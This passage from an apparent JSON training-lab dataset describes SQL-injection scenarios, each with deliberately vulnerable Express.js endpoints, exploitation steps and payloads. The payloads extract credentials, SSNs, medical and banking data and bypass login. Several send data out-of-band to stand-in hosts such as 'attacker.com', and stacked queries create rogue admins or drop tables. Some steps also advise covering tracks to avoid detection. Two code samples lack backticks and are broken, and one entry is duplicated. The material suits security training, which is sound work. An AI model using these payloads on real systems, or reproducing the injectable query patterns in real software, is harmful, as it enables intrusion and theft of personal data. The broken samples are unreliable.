      "Use UNION SELECT to retrieve multiple room availability records.",
      "Verify successful extraction of room information from the database."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/check-availability', (req, res) => {\n  const { room_type, date } = req.query;\n  const sql = `SELECT * FROM rooms WHERE room_type = '${room_type}' AND available_date = '${date}'`; \n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Error checking availability');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT room_type, price, available_dates FROM rooms --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Event Management System - SQL Injection in Event Registration",
    "Lab Description": "The event management system's registration form is vulnerable to SQL Injection. An attacker can use SQL injection to manipulate registration details and extract attendee information.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the event registration request using Burp Suite to identify vulnerable parameters (event_id, attendee_id).",
      "Inject SQL payloads like ' UNION SELECT attendee_name, event_name, registration_status FROM event_registrations -- to extract attendee data.",
      "Use UNION SELECT to retrieve multiple event registration records.",
      "Verify successful extraction or modification of event registration data."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/register-event', (req, res) => {\n  const { event_id, attendee_id, registration_status } = req.body;\n  const sql = `INSERT INTO event_registrations (event_id, attendee_id, registration_status) VALUES ('${event_id}', '${attendee_id}', '${registration_status}')`; \n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Error registering for event');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "' UNION SELECT attendee_name, event_name, registration_status FROM event_registrations --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Online Auction System - SQL Injection in Bid Submission",
    "Lab Description": "The online auction system is vulnerable to SQL Injection in the bid submission form. An attacker can inject SQL payloads to retrieve auction details such as highest bid, bidder details, and item information.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept the bid submission request using Burp Suite to identify vulnerable parameters (auction_id, bid_amount).",
      "Inject SQL payloads like ' UNION SELECT item_name, highest_bid, bidder_id FROM auction_items -- to extract auction data.",
      "Use time-based SQL injection to confirm the presence of data.",
      "Verify successful extraction or manipulation of auction details."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/submit-bid', (req, res) => {\n  const { auction_id, bid_amount } = req.body;\n  const sql = `INSERT INTO bids (auction_id, bid_amount) VALUES ('${auction_id}', '${bid_amount}')`; \n  db.query(sql, (err, result) => {\n    if (err)res.status(500).send('Error submitting bid');\n else res.json({ success: true });\n });\n});",
    "payloads": [
      "' UNION SELECT item_name, highest_bid, bidder_id FROM auction_items --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "E-commerce Admin Portal - SQL Injection in Order Management",
    "Lab Description": "The e-commerce platform's admin portal is vulnerable to SQL Injection when managing customer orders. An attacker who compromises an admin account could extract or modify customer order histories, payment statuses, and shipping details.",
    "Difficulty Level": "Very Hard",
    "Solution Steps": [
      "Login as an admin (or hijack a session) and intercept the order management requests.",
      "Identify vulnerable parameters (order_id, customer_id).",
      "Inject SQL payloads like ' UNION SELECT customer_name, order_total, shipping_address FROM orders -- to extract sensitive data.",
      "Verify extraction of order histories or manipulation of order records."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/admin/manage-orders', (req, res) => {\n const { order_id } = req.query;\n const sql = SELECT * FROM orders WHERE order_id = '${order_id}'; \n db.query(sql, (err, result) => {\n if (err) res.status(500).send('Error retrieving order');\n else res.json(result);\n });\n});",
    "payloads": [
      "' UNION SELECT customer_name, order_total, shipping_address FROM orders --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "IoT Management Platform - SQL Injection in Device Configuration",
    "Lab Description": "The IoT platform for device management has a vulnerable configuration upload feature that accepts SQL queries without proper sanitization. Attackers could extract device configurations, firmware versions, and private device keys.",
    "Difficulty Level": "Very Hard",
    "Solution Steps": [
      "Intercept the configuration upload request using Burp Suite to find vulnerable parameters (device_id, config_name).",
      "Inject payloads like ' UNION SELECT device_id, firmware_version, private_key FROM device_configs --.",
      "Use time-based SQL injection techniques to extract private device keys.",
      "Confirm unauthorized access to confidential IoT device configurations."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/upload-config', (req, res) => {\n const { device_id, config_name } = req.body;\n const sql = INSERT INTO device_configs (device_id, config_name) VALUES ('${device_id}', '${config_name}'); \n db.query(sql, (err, result) => {\n if (err) res.status(500).send('Error uploading config');\n else res.json({ success: true });\n });\n});",
    "payloads": [
      "' UNION SELECT device_id, firmware_version, private_key FROM device_configs --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Healthcare Portal - SQL Injection in Patient Record Search",
    "Lab Description": "A healthcare portal allows searching patient records by name. The search functionality is vulnerable to SQL Injection, risking exposure of confidential medical records and insurance information.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Access the patient search feature and monitor requests.",
      "Inject SQL payloads in the 'patient_name' parameter to retrieve all records.",
      "Use UNION-based SQL injection to extract patient medical histories.",
      "Confirm unauthorized access to sensitive healthcare data."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/search-patient', (req, res) => {\n  const { patient_name } = req.query;\n  const sql = `SELECT * FROM patients WHERE name LIKE '%${patient_name}%'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Search failed');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT name, insurance_number, diagnosis FROM patients --",
      "' OR '1'='1"
    ]
  },
  {
    "Lab scenario": "Online Travel Booking - SQL Injection in Flight Search",
    "Lab Description": "The flight search functionality in an online travel booking system is vulnerable to SQL Injection, exposing flight reservation details and traveler profiles.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Perform a flight search and intercept the request.",
      "Inject payloads into the 'destination' or 'origin' fields.",
      "Leverage UNION-based SQL injection to enumerate traveler profiles.",
      "Extract booking IDs and customer information."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/search-flight', (req, res) => {\n  const { destination } = req.query;\n  const sql = `SELECT * FROM flights WHERE destination = '${destination}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Flight search failed');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT flight_number, passenger_name, seat FROM flights --",
      "' OR '1'='1' --"
    ]
  },
  {
    "Lab scenario": "CMS Platform - SQL Injection in Article Management",
    "Lab Description": "The CMS article editing feature does not sanitize input properly, allowing an attacker to exploit SQL Injection to modify or delete content.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Login as a low-privileged user and edit an article.",
      "Inject payloads into the 'article_id' or 'title' fields.",
      "Perform UNION SQL injection to escalate privileges or modify database entries."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/edit-article', (req, res) => {\n  const { article_id, title } = req.body;\n  const sql = `UPDATE articles SET title = '${title}' WHERE id = '${article_id}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Update failed');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "' UNION SELECT username, password, email FROM users --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Banking App - SQL Injection in Account Balance Retrieval",
    "Lab Description": "The online banking app allows users to retrieve their account balance but lacks input sanitization, enabling attackers to view other customers\u00e2\u20ac\u2122 account information.",
    "Difficulty Level": "Very Hard",
    "Solution Steps": [
      "Capture the balance retrieval API call.",
      "Inject SQL payloads into the 'account_id' parameter.",
      "Use boolean-based SQL injection techniques to confirm unauthorized data access."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/account-balance', (req, res) => {\n  const { account_id } = req.query;\n  const sql = `SELECT balance FROM accounts WHERE account_id = '${account_id}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Balance retrieval error');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' OR '1'='1' --",
      "' UNION SELECT user_id, balance, account_type FROM accounts --"
    ]
  },
  {
    "Lab scenario": "Online Marketplace - SQL Injection in Category Filter",
    "Lab Description": "An online marketplace's category filter does not properly validate input, making it susceptible to SQL Injection, leading to exposure of all products and users\u00e2\u20ac\u2122 personal details.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use category filters and inspect the requests.",
      "Inject payloads into the 'category' parameter to access restricted product information.",
      "Confirm data leak via extracted product lists and seller information."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/filter-products', (req, res) => {\n  const { category } = req.query;\n  const sql = `SELECT * FROM products WHERE category = '${category}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Filtering error');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT name, price, description FROM products --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Hotel Reservation System - SQL Injection in Booking Lookup",
    "Lab Description": "The hotel reservation system allows users to check booking status by ID, but the lookup feature is vulnerable to SQL Injection, risking customer booking records.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Submit a booking lookup request and tamper with the 'booking_id' field.",
      "Inject SQL payloads to retrieve all booking records.",
      "Confirm exposure of customer names, stay dates, and payment statuses."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/lookup-booking', (req, res) => {\n  const { booking_id } = req.query;\n  const sql = `SELECT * FROM bookings WHERE booking_id = '${booking_id}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Lookup failed');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT guest_name, checkin_date, checkout_date FROM bookings --",
      "' OR '1'='1' --"
    ]
  },
  {
    "Lab scenario": "Educational Platform - SQL Injection in Exam Result Checker",
    "Lab Description": "An education portal\u00e2\u20ac\u2122s exam result checker lacks input validation, enabling an attacker to perform SQL Injection to retrieve students' scores and grades.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use the exam result checker and monitor traffic.",
      "Inject SQL payloads into the 'student_id' parameter.",
      "Extract student names and grades via UNION-based SQL injection."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/check-result', (req, res) => {\n  const { student_id } = req.query;\n  const sql = `SELECT * FROM exam_results WHERE student_id = '${student_id}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Result checking failed');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT student_name, subject, score FROM exam_results --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Inventory Management System - SQL Injection in Item Update",
    "Lab Description": "The inventory update feature does not properly sanitize user inputs, allowing SQL Injection to manipulate product inventory and pricing data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept inventory update requests.",
      "Inject payloads into the 'item_id' or 'new_price' fields.",
      "Leverage SQL Injection to update unauthorized inventory entries."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/update-inventory', (req, res) => {\n  const { item_id, new_price } = req.body;\n  const sql = `UPDATE inventory SET price = '${new_price}' WHERE id = '${item_id}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Update failed');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "'; UPDATE inventory SET stock = 9999 WHERE id = '1",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Charity Donation Platform - SQL Injection in Donation History",
    "Lab Description": "The donation history page is vulnerable to SQL Injection, allowing attackers to view donor personal information and donation amounts.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Navigate to the donation history lookup.",
      "Inject payloads into the 'donor_id' parameter.",
      "Confirm leakage of donor names and donation records via SQL injection."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/donation-history', (req, res) => {\n  const { donor_id } = req.query;\n  const sql = `SELECT * FROM donations WHERE donor_id = '${donor_id}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Error fetching donation history');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT donor_name, amount, date FROM donations --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Food Delivery App - SQL Injection in Order Tracking",
    "Lab Description": "Order tracking by order ID in a food delivery application is vulnerable to SQL Injection, allowing exposure of customer addresses and order details.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Track an order and intercept the order tracking request.",
      "Inject payloads into the 'order_id' parameter.",
      "Extract full customer orders using SQL injection techniques."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/track-order', (req, res) => {\n  const { order_id } = req.query;\n  const sql = `SELECT * FROM orders WHERE order_id = '${order_id}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Tracking failed');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT customer_name, address, order_total FROM orders --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Food Delivery App - SQL Injection in Order Tracking",
    "Lab Description": "Order tracking by order ID in a food delivery application is vulnerable to SQL Injection, allowing exposure of customer addresses and order details.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Track an order and intercept the order tracking request.",
      "Inject payloads into the 'order_id' parameter.",
      "Extract full customer orders using SQL Injection.",
      "Confirm leakage of address, order contents, and payment details."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/track-order', (req, res) => {\n  const { order_id } = req.query;\n  const sql = `SELECT * FROM orders WHERE order_id = '${order_id}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Order tracking failed');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT customer_name, address, payment_status FROM orders --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Banking Portal - Time-Based SQL Injection in Transaction History",
    "Lab Description": "Transaction history lookup uses raw SQL queries based on the account number without sanitization. The application delays response timing based on injected SQL sleep commands, allowing attackers to infer database contents using blind methods. To solve: extract admin account credentials using time-based SQLi inference.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept transaction lookup requests.",
      "Inject time-based payloads into the 'account_id' parameter and monitor delays.",
      "Craft nested sleep() queries to retrieve username characters.",
      "Automate using sqlmap with '--technique=T' mode.",
      "Verify by logging in using extracted credentials."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/history', (req, res) => {\n  const { account_id } = req.query;\n  db.query(`SELECT * FROM transactions WHERE account_id = '${account_id}'`, (err, data) => {\n    if (err) res.status(500).send('Error');\n    else res.json(data);\n  });\n});",
    "payloads": [
      "' OR IF(SUBSTRING((SELECT username FROM users LIMIT 1),1,1)='a',SLEEP(5),0) -- ",
      "'||(SELECT IF(ASCII(SUBSTRING((SELECT password FROM users WHERE role='admin'),1,1))>77,SLEEP(3),0))||'"
    ]
  },
  {
    "Lab scenario": "IoT Management Dashboard - UNION SQL Injection in Device Search",
    "Lab Description": "A device search function concatenates user input into a SQL ORDER BY clause without validation, leading to UNION-based SQL Injection. Attackers can enumerate all device passwords. To solve: retrieve admin IoT credentials through crafted UNION payloads.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use OWASP ZAP to capture the search request to '/devices'.",
      "Test basic SQLi payloads like 'ORDER BY 1--'.",
      "Inject a UNION payload to fetch device usernames and passwords.",
      "Extract sensitive admin IoT device credentials.",
      "Log in as an administrator into the IoT dashboard."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/devices', (req, res) => {\n  const { sortBy } = req.query;\n  db.query(`SELECT * FROM devices ORDER BY ${sortBy}`, (err, devices) => {\n    if (err) res.status(500).send('Sort Error');\n    else res.json(devices);\n  });\n});",
    "payloads": [
      "1 UNION SELECT username,password FROM devices -- ",
      "name UNION ALL SELECT NULL,password FROM users --"
    ]
  },
  {
    "Lab scenario": "Bank API Gateway - Out-of-Band SQL Injection in Payment Initiation",
    "Lab Description": "The bank API for initiating payments is vulnerable to Out-of-Band (OOB) SQL Injection by mishandling 'reference_id'. Attackers can trigger DNS callbacks or HTTP exfiltration channels. To solve: perform successful OOB data exfiltration via Burp Collaborator.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite Collaborator to prepare a payload domain.",
      "Submit crafted reference_id payloads that perform OOB lookups.",
      "Trigger exfiltration using OOB SQLi with dns/HTTP requests.",
      "Capture leaked session tokens or credentials on the Collaborator server.",
      "Use the leaked data to impersonate a payment session."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/api/pay', (req, res) => {\n  const { reference_id } = req.body;\n  db.query(`INSERT INTO payments (reference_id) VALUES ('${reference_id}')`, (err) => {\n    if (err) res.status(500).send('Payment Failed');\n    else res.send('Payment initiated');\n  });\n});",
    "payloads": [
      "'; exec master..xp_dirtree '//your-collaborator.com/a' --",
      "'; SELECT load_file('\\\\your-collaborator.com\\payload') --",
      "'; COPY (SELECT current_user) TO PROGRAM 'curl http://your-server.com/?user='||current_user --"
    ]
  },
  {
    "Lab scenario": "CMS Admin Panel - Boolean-Based SQL Injection in User Role Verification",
    "Lab Description": "The CMS checks administrative roles based on unsafe SQL queries using user_id parameters without sanitization. Boolean-based conditions allow attackers to infer admin roles by observing response differences. To solve: enumerate admin accounts through Boolean-based inference.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to send crafted POST requests with modified 'user_id'.",
      "Observe responses for true/false behaviors based on injected boolean expressions.",
      "Use binary search to infer admin account IDs.",
      "Manually craft payloads or automate using sqlmap '--technique=B'.",
      "Login as admin with identified credentials."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/verify-role', (req, res) => {\n  const { user_id } = req.body;\n  db.query(`SELECT * FROM roles WHERE user_id = '${user_id}' AND role='admin'`, (err, result) => {\n    if (err) res.status(500).send('Error');\n    else res.json({ valid: result.length > 0 });\n  });\n});",
    "payloads": [
      "' OR 1=1 --",
      "' OR 1=0 --",
      "' OR EXISTS(SELECT * FROM users WHERE username='admin') --"
    ]
  },
  {
    "Lab scenario": "Banking Portal - Error-Based SQL Injection in User Profile Update",
    "Lab Description": "Profile update functionality includes SQL error details when invalid input is submitted. Attackers can exploit verbose error messages to extract database structure using error-based SQL Injection. To solve: leak table names and user data using crafted payloads.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Intercept profile update requests via Burp Suite.",
      "Submit invalid inputs and observe database errors.",
      "Inject payloads triggering SQL errors (division by zero, syntax errors).",
      "Analyze leaked error messages to retrieve database schema.",
      "Use retrieved table names to extract user information."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/update-profile', (req, res) => {\n  const { username } = req.body;\n  db.query(`UPDATE users SET username = '${username}' WHERE id = 1`, (err) => {\n    if (err) res.status(500).send('Profile update failed: ' + err.message);\n    else res.send('Profile updated');\n  });\n});",
    "payloads": [
      "'",
      "' OR 1=1 --",
      "' UNION SELECT 1,table_name FROM information_schema.tables --",
      "'|| (SELECT 1/0) --"
    ]
  },
  {
    "Lab scenario": "Bank Internal Admin Panel - UNION SQL Injection via Department Filter",
    "Lab Description": "A hidden admin panel for managing bank employees accepts a 'department' filter that is vulnerable to UNION-based SQL Injection. Attackers can retrieve sensitive employee payroll data by injecting UNION payloads through the filter. To solve: leak and extract payroll records.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Discover the hidden 'department' parameter using Burp Intruder.",
      "Inject UNION-based payloads to test column count and types.",
      "Extract sensitive salary, employee ID, and SSN records.",
      "Automate extraction using sqlmap with UNION mode.",
      "Access restricted employee salary reports using leaked data."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/admin/employees', (req, res) => {\n  const { department } = req.query;\n  db.query(`SELECT * FROM employees WHERE department = '${department}'`, (err, employees) => {\n    if (err) res.status(500).send('Fetch failed');\n    else res.json(employees);\n  });\n});",
    "payloads": [
      "' UNION SELECT id, name, ssn, salary FROM employees -- ",
      "' UNION ALL SELECT NULL, username, password, NULL FROM users --"
    ]
  },
  {
    "Lab scenario": "Mobile Banking App API - Blind SQL Injection in Balance Inquiry",
    "Lab Description": "The API endpoint '/api/balance' accepts an 'account_id' parameter that is not properly sanitized, leading to Boolean-Blind SQL Injection. Attackers can infer account balances and usernames by triggering true/false conditions. To solve: enumerate the database content using boolean-based inference.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Repeater to modify 'account_id' requests.",
      "Inject crafted payloads and monitor responses.",
      "Use TRUE/FALSE conditions like 'OR 1=1' and 'OR 1=2'.",
      "Slowly extract database entries through logical inference.",
      "Automate with sqlmap '--technique=B' option if needed."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/api/balance', (req, res) => {\n  const { account_id } = req.query;\n  db.query(`SELECT balance FROM accounts WHERE id = '${account_id}'`, (err, result) => {\n    if (err) res.status(500).send('Error');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' OR 1=1 --",
      "' AND 1=2 --",
      "' OR (SELECT CASE WHEN (SUBSTR((SELECT username FROM users LIMIT 1),1,1)='a') THEN 1 ELSE 0 END) --"
    ]
  },
  {
    "Lab scenario": "Banking Loan Application Portal - Error-Based SQL Injection in Application ID",
    "Lab Description": "Loan applications are retrievable using an 'application_id' parameter without input validation, exposing error-based SQL Injection. Attackers can force SQL errors that leak backend table names and column data. To solve: retrieve full loan applications and customer credit scores.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Capture traffic to '/loan/view' endpoint.",
      "Inject invalid inputs causing SQL syntax errors.",
      "Analyze database error messages for information leaks.",
      "Craft error-based UNION payloads to retrieve credit scores.",
      "Access confidential loan approval data."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/loan/view', (req, res) => {\n  const { application_id } = req.query;\n  db.query(`SELECT * FROM loan_applications WHERE id = '${application_id}'`, (err, data) => {\n    if (err) res.status(500).send('Error: ' + err.message);\n    else res.json(data);\n  });\n});",
    "payloads": [
      "' UNION SELECT null,table_name FROM information_schema.tables --",
      "' OR 1=1 --",
      "'||(SELECT 1/0)||'"
    ]
  },
  {
    "Lab scenario": "IoT Payment Reader API - OOB SQL Injection on Device Registration",
    "Lab Description": "IoT payment readers register to the API by providing 'device_serial' numbers. Improper validation causes Out-of-Band SQL Injection, allowing attackers to exfiltrate data via external DNS servers. To solve: perform successful DNS exfiltration via crafted SQL payloads.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Collaborator to set up a payload receiver.",
      "Intercept device registration requests and modify 'device_serial'.",
      "Inject payloads triggering DNS callbacks via database functions.",
      "Capture database name, version, or user info through external requests.",
      "Report the stolen device authentication tokens."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/iot/register', (req, res) => {\n  const { device_serial } = req.body;\n  db.query(`INSERT INTO devices (serial) VALUES ('${device_serial}')`, (err) => {\n    if (err) res.status(500).send('Device Registration Error');\n    else res.send('Device Registered');\n  });\n});",
    "payloads": [
      "'; exec master..xp_dirtree '//attacker.com/abc' --",
      "'; SELECT LOAD_FILE('\\\\attacker.com\\data') --"
    ]
  },
  {
    "Lab scenario": "Bank Admin Portal - Stacked Query SQL Injection in Batch Payment Processing",
    "Lab Description": "The batch payment upload feature concatenates unvalidated fields directly into SQL queries. Stacked queries allow attackers to inject malicious statements, leading to privilege escalation or backdoor creation. To solve: inject stacked queries to create a rogue admin account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept a batch upload request using Burp Suite.",
      "Craft payloads ending the legitimate query and starting a new one.",
      "Insert SQL commands to create a new admin account.",
      "Access the admin dashboard using the injected credentials.",
      "Cleanup traces after exploitation."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/batch-upload', (req, res) => {\n  const { batch_name } = req.body;\n  db.query(`INSERT INTO batches (name) VALUES ('${batch_name}')`, (err) => {\n    if (err) res.status(500).send('Batch upload failed');\n    else res.send('Batch processed');\n  });\n});",
    "payloads": [
      "batch1'; INSERT INTO users (username, password, role) VALUES ('eviladmin', 'password123', 'admin') --",
      "batch2'; DROP TABLE users --"
    ]
  },
  {
    "Lab scenario": "Banking Web Interface - SQL Injection via ORDER BY in Transaction History",
    "Lab Description": "The transaction history page uses a dynamic 'sort_by' parameter in the ORDER BY clause without proper validation. This allows attackers to manipulate the clause to trigger SQL errors or extract hidden fields. To solve: exploit ORDER BY injection to leak hidden transaction metadata.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp to intercept the request and tamper the 'sort_by' parameter.",
      "Inject numeric and column name values to test sorting behavior.",
      "Inject 'ORDER BY 100--' to trigger database error leakage.",
      "Use 'ORDER BY CASE WHEN (SELECT ...)' to extract field values.",
      "Enumerate column names from information_schema using crafted ORDER logic."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/transactions', (req, res) => {\n  const { sort_by } = req.query;\n  const query = `SELECT * FROM transactions ORDER BY ${sort_by}`;\n  db.query(query, (err, result) => {\n    if (err) res.status(500).send(err.message);\n    else res.json(result);\n  });\n});",
    "payloads": [
      "amount DESC;--",
      "1;SELECT NULL FROM users--",
      "CASE WHEN (SELECT COUNT(*) FROM users) > 0 THEN amount ELSE date END"
    ]
  },
  {
    "Lab scenario": "Mobile Banking API - SQL Injection via JSON Body in Login Endpoint",
    "Lab Description": "The login API parses JSON request bodies without sanitizing the 'username' field before embedding into a SQL query. Attackers can exploit this vector to perform JSON-based SQL Injection. To solve: bypass authentication and extract user roles.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to send crafted JSON payloads to '/api/login'.",
      "Inject SQL payloads in 'username' JSON key to bypass auth.",
      "Use 'OR 1=1--' style payloads to login without credentials.",
      "Chain injection with UNION SELECT to enumerate roles.",
      "Access admin portal with escalated privileges."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/api/login', (req, res) => {\n  const { username, password } = req.body;\n  const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;\n  db.query(query, (err, result) => {\n    if (result.length > 0) res.send('Welcome');\n    else res.status(401).send('Invalid credentials');\n  });\n});",
    "payloads": [
      "{ \"username\": \"' OR 1=1--\", \"password\": \"abc\" }",
      "{ \"username\": \"' UNION SELECT null, 'admin', 'admin' --\", \"password\": \"\" }"
    ]
  },
  {
    "Lab scenario": "Banking CMS Panel - Time-Based SQL Injection in User Profile Edit",
    "Lab Description": "The edit profile form allows updates via a 'user_id' parameter vulnerable to time-based SQL Injection. Attackers can extract admin credentials by observing response delays. To solve: exploit timing side channels to exfiltrate password hashes.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Intruder with a delay payload in 'user_id'.",
      "Inject 'SLEEP(5)' or 'pg_sleep(5)' payloads.",
      "Infer character-by-character admin password by time delay.",
      "Automate with sqlmap using '--technique=T'.",
      "Log into admin portal using recovered password hash."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/edit-profile', (req, res) => {\n  const { user_id, email } = req.body;\n  db.query(`UPDATE users SET email='${email}' WHERE id='${user_id}'`, (err) => {\n    if (err) res.status(500).send('Update failed');\n    else res.send('Updated');\n  });\n});",
    "payloads": [
      "1' OR IF(1=1, SLEEP(5), 0)--",
      "1'; WAITFOR DELAY '00:00:05'--"
    ]
  },
  {
    "Lab scenario": "Bank Staff API - SQL Injection in XML-Based Login Service",
    "Lab Description": "The legacy SOAP-based login API parses XML and injects values directly into SQL without validation. This leads to SQL Injection via XML elements. To solve: extract the database version and active session tokens.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use SOAP UI or Postman to craft XML login requests.",
      "Inject SQL payloads into <username> XML tag.",
      "Leak SQL error messages to infer database behavior.",
      "Use UNION SELECT to dump session tokens.",
      "Replay session tokens to hijack authenticated sessions."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/staff-login', (req, res) => {\n  xmlParser(req.body, (err, result) => {\n    const { username, password } = result.credentials;\n    const query = `SELECT * FROM staff WHERE user = '${username}' AND pass = '${password}'`;\n    db.query(query, (err, user) => {\n      if (user) res.send('Logged in');\n      else res.status(401).send('Invalid');\n    });\n  });\n});",
    "payloads": [
      "<username>' OR 1=1--</username>",
      "<username>' UNION SELECT version(), null--</username>"
    ]
  },
  {
    "Lab scenario": "Bank Admin Scheduler - GROUP BY SQL Injection in Event Aggregation",
    "Lab Description": "Admin reports group events by user and device type using unfiltered user input. Improper use of GROUP BY enables SQL Injection leading to privilege escalation. To solve: inject payloads into GROUP BY clause to access hidden audit logs.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the report request with Burp.",
      "Inject fake column names in GROUP BY via manipulated inputs.",
      "Trigger SQL errors with incorrect GROUP logic.",
      "Use CASE WHEN expressions to extract additional rows.",
      "Enumerate other admin actions logged in audit tables."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/admin/reports', (req, res) => {\n  const { group_field } = req.query;\n  db.query(`SELECT ${group_field}, COUNT(*) FROM logs GROUP BY ${group_field}`,(err, rows) => {\n    if (err) res.status(500).send('Error');\n    else res.json(rows);\n  });\n});",
    "payloads": [
      "device_type, (SELECT password FROM admins LIMIT 1)--",
      "user_id, CASE WHEN (1=1) THEN NULL ELSE NULL END"
    ]
  },
  {
    "Lab scenario": "Banking Dashboard - Stacked SQL Injection via Currency Conversion Widget",
    "Lab Description": "The currency converter widget takes an amount and a target currency via query params. Due to improper input sanitation, attackers can inject stacked SQL queries to modify exchange rate tables. To solve: override USD conversion rates to gain financial advantage.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept widget request with '?currency=' parameter.",
      "Inject stacked queries using ';' to alter database state.",
      "Update exchange rates to attacker-controlled values.",
      "Force a large USD->BTC transfer using inflated rate.",
      "Revert changes to avoid detection."
    ],
    "Vulnerability name": "SQL Injection",
